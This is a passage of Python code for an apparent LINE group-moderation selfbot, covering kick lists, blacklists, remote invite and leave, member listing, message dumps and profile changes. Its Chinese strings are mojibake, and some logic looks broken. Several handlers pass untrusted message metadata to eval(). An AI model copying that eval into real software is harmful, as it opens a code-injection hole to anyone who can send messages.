                            txt += "\nÎÎÎÎÎæ–°å¢æˆåŠŸÎÎÎÎÎ"
                            no = 0
                            if len(klist) != 0:
                                for x in klist:
                                    y = han.getContact(x)
                                    try:
                                        ybk['kick'].append(x)
                                        backupData()
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            txt += "\nÎÎÎÎÎæ–°å¢å¤±æ•—ÎÎÎÎÎ"
                            no = 0
                            if len(klist2) != 0:
                                for x in klist2:
                                    y = han.getContact(x)
                                    try:
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            han.replyMessage(msg, txt + "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                        del klist
                        del klist2 
                    elif text.startswith("kdel"):
                        klist = []
                        klist2 = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1]  in ybk['kick']:
                                    if mid[1] not in klist:
                                        klist.append(mid[1])
                                else:
                                    if mid[1] not in klist2:
                                        klist2.append(mid[1])
                            txt = "ÎÎÎÎÎã€˜ç§»é™¤è¸¢äººåå–®ã€™ÎÎÎÎÎ"
                            txt += "\nÎÎÎÎÎç§»é™¤æˆåŠŸÎÎÎÎÎ"
                            no = 0
                            if len(klist) != 0:
                                for x in klist:
                                    y = han.getContact(x)
                                    try:
                                        ybk['kick'].remove(x)
                                        backupData()
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            txt += "\nÎÎÎÎÎç§»é™¤å¤±æ•—ÎÎÎÎÎ"
                            no = 0
                            if len(klist2) != 0:
                                for x in klist2:
                                    y = han.getContact(x)
                                    try:
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            han.replyMessage(msg, txt + "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                        del klist
                        del klist2 
                    elif text.startswith("tadd"):
                        klist = []
                        klist2 = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] not in ttkl['kick'] and mid[1] not in admin['admin'] and mid[1] not in creator['creator']:
                                    if mid[1] not in klist:
                                        klist.append(mid[1])
                                else:
                                    if mid[1] not in klist2:
                                        klist2.append(mid[1])
                            txt = "ÎÎÎÎã€˜æ–°å¢å°ˆæ­¦åå–®ã€™ÎÎÎÎ"
                            txt += "\nÎÎÎÎÎæ–°å¢æˆåŠŸÎÎÎÎÎ"
                            no = 0
                            if len(klist) != 0:
                                for x in klist:
                                    y = han.getContact(x)
                                    try:
                                        ttkl['kick'].append(x)
                                        backupData()
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            txt += "\nÎÎÎÎÎæ–°å¢å¤±æ•—ÎÎÎÎÎ"
                            no = 0
                            if len(klist2) != 0:
                                for x in klist2:
                                    y = han.getContact(x)
                                    try:
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            han.replyMessage(msg, txt + "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                        del klist
                        del klist2 
                    elif text.startswith("tdel"):
                        klist = []
                        klist2 = []
                        if 'MENTION' in msg[18]:
                            key = eval(msg[18]["MENTION"])
                            tags = key["MENTIONEES"]
                            for tag in tags:
                                mid = han.getContact(tag['M'])
                                if mid[1] in ttkl['kick']   :
                                    if mid[1] not in klist:
                                        klist.append(mid[1])
                                else:
                                    if mid[1] not in klist2:
                                        klist2.append(mid[1])
                            txt = "ÎÎÎã€˜ç§»é™¤å°ˆæ­¦åå–®ã€™ÎÎÎ"
                            txt += "\nÎÎÎÎÎç§»é™¤æˆåŠŸÎÎÎÎÎ"
                            no = 0
                            if len(klist) != 0:
                                for x in klist:
                                    y = han.getContact(x)
                                    try:
                                        ttkl['kick'].remove(x)
                                        backupData()
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            txt += "\nÎÎÎÎÎç§»é™¤å¤±æ•—ÎÎÎÎÎ"
                            no = 0
                            if len(klist2) != 0:
                                for x in klist2:
                                    y = han.getContact(x)
                                    try:
                                        no += 1
                                        txt +=  f"\nâ€»{no}.{y[22]}"
                                    except:
                                        pass
                            else:
                                txt += "\nç„¡"
                            han.replyMessage(msg, txt + "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                        del klist
                        del klist2
                    elif text.startswith("caadd:"):
                        isi = text.replace("caadd:","")
                        print(isi)
                        a = han.getChats([msg[2]])
                        gmb = a[1][0][8][1][5]
                        target = []
                        cancel = []
                        if gmb != None:
                            for g in gmb:
                                y = han.getContact(g)
                                if y in gmb:
                                    target.append(y)
                        if target == []:
                            han.replyMessage(msg,"æ²’æœ‰ç¬¦åˆçš„å°è±¡")
                            pass
                        else:
                            for i in target:
                                ybk["cancel"].append(i)
                                backupData()
                                cancel.append(i)
                                txt = "ÎÎÎã€˜æ–°å¢å–æ¶ˆåå–®ã€™ÎÎÎ"
                                no = 0
                                if len(cancel) != 0:
                                    for x in cancel:
                                        no += 1
                                        txt += f"\nâ€»{no}.{x[22]}"
                                else:
                                    txt += "\nç„¡"
                                han.replyMessage(msg, txt + "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ") 
                        del target
                        del cancel
                    elif text.startswith("lbinv:"):
                        if msg[1] in creator['creator']:
                            gid = text.replace("lbinv:","")
                            try:
                                try:
                                    han.findAndAddContactsByMid([msg[1]])
                                except:
                                    pass
                                try: 
                                    try:
                                        han.inviteIntoChat(gid,[msg[1]])
                                        han.sendMessage(gid,"æ¥æ”¶é ç«¯é‚€è«‹æŒ‡ä»¤")
                                        han.replyMessage(msg,"é‚€è«‹æˆåŠŸ")
                                    except Exception as e:
                                        print(e)
                                        han.replyMessage(msg, "é‚€è«‹å¤±æ•—")
                                except:
                                    han.replyMessage(msg, "é‚€è«‹å¤±æ•—")  
                            except:
                                han.replyMessage(msg, "Error-->invalid gid")
                        else:
                            han.replyMessage(msg, "ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                            report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦ä½¿ç”¨é ç«¯é‚€è«‹æŒ‡ä»¤")
                    elif text.startswith("lbleave:"):
                        if msg[1] in creator['creator']:
                            try:
                                gid = text.replace("lbleave:","")
                                print(gid)
                                if gid == "":
                                    han.replyMessage(msg, "è«‹è¼¸å…¥ç¾¤çµ„Gid")
                                else:
                                    try:
                                        han.sendMessage(gid,"æ¥æ”¶é ç«¯é€€ç¾¤æŒ‡ä»¤")
                                        han.deleteSelfFromChat(gid)
                                        han.replyMessage(msg,"é€€ç¾¤æˆåŠŸ")
                                    except:
                                        han.replyMessage(msg, "æˆ‘ä¸åœ¨é‚£å€‹ç¾¤çµ„è£¡")  
                            except:
                                han.replyMessage(msg, "Error-->invalid gid")
                        else:
                            han.replyMessage(msg, "ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                            report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦ä½¿ç”¨é ç«¯é€€ç¾¤æŒ‡ä»¤")
                    elif text.startswith("lbpn:"):
                        if msg[1] in creator['creator']:
                            key = msg[10][5:]
                            if len(key) == 0:
                                han.replyMessage(msg, 'Rename Error')
                            else:
                                han.updateProfileAttribute(2, key)
                                han.replyMessage(msg, f'åç¨±å·²æ›´æ”¹ç‚º:\n{key}')
                        else:
                            han.replyMessage(msg, "ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                            report(msg[2],msg[1],"æ¬Šé™è€…å˜—è©¦æ›´æ”¹åç¨±")
                    elif text.startswith("lbcb:"): 
                        if msg[1] in creator['creator']:
                            bio = msg[10][5:]
                            han.updateProfileAttribute(16, bio)
                            han.replyMessage(msg, f'å€‹ç°½å·²æ›´æ”¹ç‚º:\n{bio}')
                        else:
                            han.replyMessage(msg, "ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                            report(msg[2],msg[1],"æ¬Šé™è€…å˜—è©¦æ›´æ”¹å€‹ç°½")
                    elif text.startswith("ginfo:"):
                        gid = msg[10][6:]
                        # if len(gid) <= 33:
                        #     han.replyMessage(msg, "Error-->invalid gid")
                        # else:
                        try:
                            group = han.getChats([gid])
                            gtime = group[1][0][3]
                            gtimee = int(round(gtime/1000))
                            try:
                                y = group[1][0][8][1][1]
                                z = han.getContact(y)
                                gCreator = z[22]
                            except:
                                gCreator = "å‰µç¾¤è€…å·²ç å¸³"
                            if group[1][0][8][1][5] is None:
                                gPending = "0"
                            else:
                                gPending = str(len(group[1][0][8][1][5]))				
                            ret_ ="ÎÎÎÎÎÎÎã€˜ç¾¤çµ„è³‡è¨Šã€™ÎÎÎÎÎÎÎ"
                            ret_ +="\nâ€»ç¾¤çµ„åç¨±:\n{}".format(str(group[1][0][6]))                    
                            ret_ +="\nâ€»æˆå“¡æ•¸é‡:\n"+(str(len(group[1][0][8][1][4])))
                            ret_ +="\nâ€»é‚€è«‹æ•¸é‡:\n"+(gPending)
                            ret_ +="\nâ€»å‰µç¾¤è€…:\n"+(str(gCreator))
                            ret_ +="\nâ€»ç¾¤çµ„å»ºç«‹æ™‚é–“:\n{}".format(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(gtimee)))
                            ret_ +="\nâ€»Gid:\n{}".format(gid)
                            ret_ +="\nÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ"
                            han.replyMessage(msg, str(ret_))
                        except:
                            han.replyMessage(msg, "Error-->invalid gid")
                    elif text.startswith("contact:"):
                        key = msg[10][8:]
                        if len(key) != 33:
                            han.sendMessage(msg[2], 'Error-->invalid mid', relatedMessageId=msg[4])
                        else:
                            try:
                                xmid = han.getContact(key)[2]
                                try:
                                    han.sendContact(msg[2], key)
                                except:
                                    pass
                            except:
                                han.sendMessage(msg[2], 'Error-->invalid mid', relatedMessageId=msg[4])
                    elif text.startswith("badd:"):
                        x = msg[10][5:]
                        y = han.getContact(x)
                        if len(x) != 33:
                            han.replyMessage(msg, "Error-->invalid mid")
                        else:
                            if x not in creator['creator'] and x not in admin['admin'] and x not in ban['blacklist']:
                                txt = "ÎÎÎÎã€˜Midæ–°å¢é»‘å–®ã€™ÎÎÎÎ"
                                ban['blacklist'].append(x)
                                backupData()
                                txt += f"\n{y[22]}\n{x}"
                                han.replyMessage(msg, txt+ "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                            else:
                                han.replyMessage(msg, "æ–°å¢å¤±æ•—")
                            report(msg[2],msg[1],"Midæ–°å¢é»‘å–®æŒ‡ä»¤è§¸ç™¼",x)
                    elif text.startswith("bdel:"):
                        x = msg[10][5:]
                        y = han.getContact(x)
                        if len(x) != 33:
                            han.replyMessage(msg, "Error-->invalid mid")
                        else:
                            if msg[1] in creator['creator']:
                                if x in ban['blacklist']:
                                    txt = "ÎÎÎÎã€˜Midåˆªé™¤é»‘å–®ã€™ÎÎÎÎ"
                                    ban['blacklist'].remove(x)
                                    backupData()
                                    txt += f"\n{y[22]}\n{x}"
                                    han.replyMessage(msg, txt+ "\nÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎ")
                                else:
                                    han.replyMessage(msg, "ä»–ä¸åœ¨é»‘å–®")
                                report(msg[2],msg[1],"Midåˆªé™¤é»‘å–®æŒ‡ä»¤è§¸ç™¼",x)
                            else:
                                han.replyMessage(msg, "ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                                report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦ä½¿ç”¨Midåˆªé™¤é»‘å–®",x)
                    elif text.startswith("data:"):
                        num = int(msg[10][5:])+1
                        try:
                            data = han.getRecentMessagesV2(msg[2])[num-1]
                            han.sendMessage(msg[2], f'{data}')
                        except Exception as e:
                            han.sendMessage(msg[2], f'{e}', relatedMessageId=msg[4])
                    elif text.startswith("gmlt:"):
                        gid = msg[10][5:]
                        try:
                            group = han.getChats([gid])
                            han.replyMessage(msg,"æˆå“¡åŠ è¼‰ä¸­...\nè«‹ç¨å¾Œ(ï½¡ï½¥Ï‰ï½¥ï½¡)")
                            gmb = group[1][0][8][1][4]
                            if len(gmb) > 500:
                                han.replyMessage(msg,"è©²ç¾¤çªç ´500äººç„¡æ³•æŸ¥è©¢")
                                pass
                            else:
                                d = ""
                                d += "ÎÎÎÎÎÎÎã€˜ç¾¤çµ„æˆå“¡ã€™ÎÎÎÎÎÎÎ\n"
                                d += "â€»ç¾¤çµ„åç¨±:{}\n".format(str(group[1][0][6]))
                                b = 0
                                for i in gmb:
                                    try:
                                        if len(str(d)) >= 8500:
                                            d += "ÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ"
                                            han.replyMessage(msg,d)
                                            d = ""
                                            d += "ÎÎÎÎÎÎÎã€˜ç¾¤çµ„æˆå“¡ã€™ÎÎÎÎÎÎÎ\n"
                                            d += "â€»ç¾¤çµ„åç¨±:{}â€»\n".format(str(group[1][0][6]))
                                        else:
                                            b = b + 1
                                            mn = han.getContact(i)[22]
                                            mi = str(i)
                                            mm = gmb[i]
                                            nn = int(round(mm/1000))
                                            kk = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(nn))))
                                            d += ("â€»{}."+mn+"\n"+mi+"\nåŠ å…¥æ™‚é–“:" + kk + "\n").format(b)
                                    except Exception as e:
                                        print(f'gmlt error-->{e}')
                                d += "ÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ"
                                time.sleep(1);han.replyMessage(msg,d)
                        except:
                            han.replyMessage(msg,"Error-->invalid gid")
                    elif text.startswith('inlt:'):
                        gid = msg[10][5:]
                        try:
                            group = han.getChats([gid])
                            han.replyMessage(msg,"é‚€è«‹åˆ—è¡¨åŠ è¼‰ä¸­...\nè«‹ç¨å¾Œ(ï½¡ï½¥Ï‰ï½¥ï½¡)")
                            gmb = group[1][0][8][1][5]
                            if len(gmb) > 500:
                                han.replyMessage(msg,"è©²ç¾¤çªç ´500äººç„¡æ³•æŸ¥è©¢")
                                pass
                            else:
                                d = ""
                                d += "ÎÎÎÎÎÎÎã€˜é‚€è«‹åˆ—è¡¨ã€™ÎÎÎÎÎÎÎ\n"
                                d += "â€»ç¾¤çµ„åç¨±:{}\n".format(str(group[1][0][6]))
                                b = 0
                                for i in gmb:
                                    try:
                                        if len(str(d)) >= 8500:
                                            d += "ÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ"
                                            han.replyMessage(msg,d)
                                            d = ""
                                            d += "ÎÎÎÎÎÎÎã€˜é‚€è«‹åˆ—è¡¨ã€™ÎÎÎÎÎÎÎ\n"
                                            d += "â€»ç¾¤çµ„åç¨±:{}â€»\n".format(str(group[1][0][6]))
                                        else:
                                            if gmb is None:
                                                d+= "â€»ç„¡é‚€è«‹åˆ—è¡¨"   
                                            else:
                                                b = b + 1
                                                mn = han.getContact(i)[22]
                                                mi = str(i)
                                                mm = gmb[i]
                                                nn = int(round(mm/1000))
                                                kk = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(nn))))
                                                d += ("â€»{}."+mn+"\n"+mi+"\né‚€è«‹æ™‚é–“:" + kk + "\n").format(b)
                                    except Exception as e:
                                        print(f'gmlt error-->{e}')
                                d += "ÎÎÎÎÎÎÎã€˜ğ“±ğ“ªğ“· ÃŸÃ´tã€™ÎÎÎÎÎÎÎ"
                                time.sleep(1);han.replyMessage(msg,d)
                        except:
                            han.replyMessage(msg,"Error-->invalid gid")
                    elif text.startswith("cbk:"):
                        if msg[1] in creator['creator']:
                            nb = msg[10][4:]
                            try:
                                han.sendMessage(nb,"æ¸¬è©¦æ›´æ”¹")
                                backdoor['backdoor'] = nb
                                backupData()
                                han.replyMessage(msg,"æ›´æ”¹æˆåŠŸ ç›®å‰å¾Œå°ç‚º:")
                                try:
                                    han.sendContact(to, nb)
                                except:
                                    f = han.getChats([nb])
                                    han.replyMessage(msg,"{}\nID:\n{}".format(str(f[1][0][6]),nb))
                                han.replyMessage(msg,"æç¤º:é‡å•Ÿå¾Œæ‰æœƒè®Šæ›´æ›´æ”¹")
                            except Exception as e:
                                han.replyMessage(msg,"æ›´æ”¹å¤±æ•— åŸå› :\n{}".format(e))
                        else:
                            han.replyMessage(msg,"ç„¡æ¬Šä½¿ç”¨é–‹ç™¼è€…æŒ‡ä»¤")
                            report(msg[2],msg[1],"ç®¡ç†å“¡å˜—è©¦æ›´æ”¹å¾Œå°")  
                if msg[15] == 1:
                    if settings["pic"] == True:
                        if msg[1] in settings["picmid"]:
                            try:
                                han.downloadObjectMsg(msg[4],path="test.jpg")
                                han.sendMessage(msg[2], "åœ–ç‰‡ä¸‹è¼‰å®Œæˆ\næ­£åœ¨æ›´æ›é ­è²¼(ï½¡ï½¥Ï‰ï½¥ï½¡)")
                                han.updateProfileImage(path="test.jpg")
                                han.sendMessage(msg[2], "æ›´æ”¹å®Œæˆ(ï½¡ï½¥Ï‰ï½¥ï½¡)")
                                settings["pic"] = False           
                                settings["picmid"] = [] 
                                backupData()   
                                os.remove("test.jpg")
                            except Exception as e:
                                print(e)
                                han.sendMessage(msg[2], "æ›´æ”¹å¤±æ•—(ï½¡ï½¥Ï‰ï½¥ï½¡)")
                                han.sendMessage(msg[2], f'{e}')
                                settings["pic"] = False           
                                settings["picmid"] = [] 
                                backupData()
                                os.remove("test.jpg")
                    if settings['cover'] == True:
                        if msg[1] in settings["covermid"]:
                            try:
                                han.downloadObjectMsg(msg[4],path="cover.jpg")
                                han.sendMessage(msg[2], "åœ–ç‰‡ä¸‹è¼‰å®Œæˆ\næ­£åœ¨æ›´æ›å°é¢(ï½¡ï½¥Ï‰ï½¥ï½¡)")
                                han.updateProfileCover(path="cover.jpg")
                                han.sendMessage(msg[2], "æ›´æ”¹å®Œæˆ(ï½¡ï½¥Ï‰ï½¥ï½¡)")
                                settings["cover"] = False           
                                settings["covermid"] = [] 
                                backupData()   
                                os.remove("cover.jpg")
                            except Exception as e:
                                print(e)
                                han.sendMessage(msg[2], "æ›´æ”¹å¤±æ•—(ï½¡ï½¥Ï‰ï½¥ï½¡)")
                                han.sendMessage(msg[2], f'{e}')
                                settings["cover"] = False           
                                settings["covermid"] = [] 
                                backupData()
                                os.remove("cover.jpg")
        except Exception as e:
            print(e)
    def main(self):
        self.start()
        try:
            self.han.trace(self.bot)
        except Exception as e:
            print(e)
            os._exit(1)
if __name__=='__main__':
    bot()
